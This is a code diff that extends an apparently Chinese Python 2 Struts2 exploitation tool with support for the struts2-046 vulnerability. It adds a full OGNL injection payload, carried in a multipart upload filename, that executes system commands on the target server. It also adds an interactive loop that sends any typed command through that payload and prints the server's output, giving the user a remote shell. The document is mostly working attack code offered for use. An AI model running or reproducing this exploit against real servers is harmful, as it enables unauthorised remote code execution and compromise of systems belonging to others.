@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # coding=utf-8
 # code by Lucifer
-# Date 2017/10/16
+# Date 2017/10/22
 
 import re
 import sys
@@ -156,6 +156,15 @@ class struts_baseverify:
             self.check("struts2-045", req.text)
         except Exception as e:
             cprint("检测struts2-045超时..", "cyan")
+            print "超时原因: ", e
+
+        try:
+            uploadexp = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='netstat -an').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x000"
+            files ={"test":(uploadexp, "text/plain")}
+            req = requests.post(self.url, files=files, timeout=6, verify=False)
+            self.check("struts2-046", req.text)
+        except Exception as e:
+            cprint("检测struts2-046超时..", "cyan")
             print "超时原因: ", e
 
         try:
@@ -355,6 +364,22 @@ class struts_baseverify:
                          }
                     try:
                         req = requests.get(self.url, headers=headers_exp, timeout=6, verify=False)
+                        print req.text
+                    except:
+                        cprint("命令执行失败!!!", "red")
+                else:
+                    sys.exit(1)
+
+        if pocname == "struts2-046":
+            while True:
+                print prompt,
+                command = raw_input()
+                command = command.strip()
+                if command != "exit":
+                    try:
+                        uploadexp = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x000"
+                        files ={"test":(uploadexp, "text/plain")}
+                        req = requests.post(self.url, files=files, timeout=6, verify=False)
                         print req.text
                     except:
                         cprint("命令执行失败!!!", "red")
